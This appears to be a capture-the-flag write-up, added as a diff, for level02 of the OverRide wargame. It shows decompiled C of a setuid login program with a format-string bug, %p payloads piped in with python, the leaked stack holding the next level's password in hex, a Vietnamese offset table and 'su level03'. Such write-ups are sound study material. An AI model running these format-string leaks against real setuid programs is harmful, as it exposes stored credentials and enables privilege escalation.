@@ -1,0 +1,125 @@
+RELRO         STACK CANARY          NX               PIE             RPATH        RUNPATH         FILE
+No RELRO 🔴    No canary found 🔴   NX disabled 🔴    No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level02/level02
+
+----------
+level02@OverRide:~$ ls -la
+total 21
+dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
+-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
+-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: hello
+--[ Password: hello
+*****************************************
+hello does not have access!
+level02@OverRide:~$ 
+
+----------
+
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    int32_t argc_1 = argc;
+    char** argv_1 = argv;
+    char var_78[0x64];
+    *__builtin_memset(&var_78, 0, 0x60) = 0;
+    char buf_1[0x30];
+    *__builtin_memset(&buf_1, 0, 0x28) = 0;
+    char buf[0x40];
+    *__builtin_memset(&buf, 0, 0x60) = 0;
+    int64_t var_10 = 0;
+    int32_t var_14 = 0;
+    FILE* fp = fopen("/home/users/level03/.pass", "r");
+    
+    if (!fp)
+    {
+        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
+        exit(1);
+        /* no return */
+    }
+    
+    int32_t rax = fread(&buf_1, 1, 0x29, fp);
+    buf_1[strcspn(&buf_1, "\n")] = 0;
+    
+    if (rax != 0x29)
+    {
+        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
+        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
+        exit(1);
+        /* no return */
+    }
+    
+    fclose(fp);
+    puts("===== [ Secure Access System v1.0 ] =====");
+    puts("/***************************************\");
+    puts("| You must login to access this system. |");
+    puts("\**************************************/");
+    printf("--[ Username: ");
+    fgets(&var_78, 0x64, __bss_start);
+    var_78[strcspn(&var_78, "\n")] = 0;
+    printf("--[ Password: ");
+    fgets(&buf, 0x64, __bss_start);
+    buf[strcspn(&buf, "\n")] = 0;
+    puts("*****************************************");
+    
+    if (!strncmp(&buf_1, &buf, 0x29))
+    {
+        printf("Greetings, %s!\n", &var_78, &var_78);
+        system("/bin/sh");
+        return 0;
+    }
+    
+    printf(&var_78);
+    puts(" does not have access!");
+    exit(1);
+    /* no return */
+}
+
+--------------- test ----------
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+--[ Password: 123--[ Password: 123
+*****************************************
+0x7fffffffe500.(nil).0x2d.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6f8.0x1f7ff9a08.0x73736150205b2d2d.0x3231203a64726f77.0x33323133.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x756e505234376848 does not have access!
+level02@OverRide:~$ 
+
+---- directly read the stack ----
+level02@OverRide:~$ python -c 'print "%22$p%23$p%24$p%25$p%26$p"' > /tmp/payload
+level02@OverRide:~$ ./level02 < /tmp/payload
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
+
+---------- 
+
+Vị trí (Offset),Dữ liệu,Giải thích
+1 - 6,"Registers (RDI, RSI, RDX...)","Trên x86_64, 6 tham số đầu nằm ở thanh ghi."
+7 - 21,Local variables / Buffers,"Các biến rác, biến cục bộ của main."
+22,buf_1 (Password),Đây là nơi mật khẩu từ file .pass được load vào!
+
+------- 
+level02@OverRide:~$ python -c 'print "%22$p.%23$p.%24$p.%25$p.%26$p"' | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d does not have access!
+level02@OverRide:~$ su level03
+-----------------
+
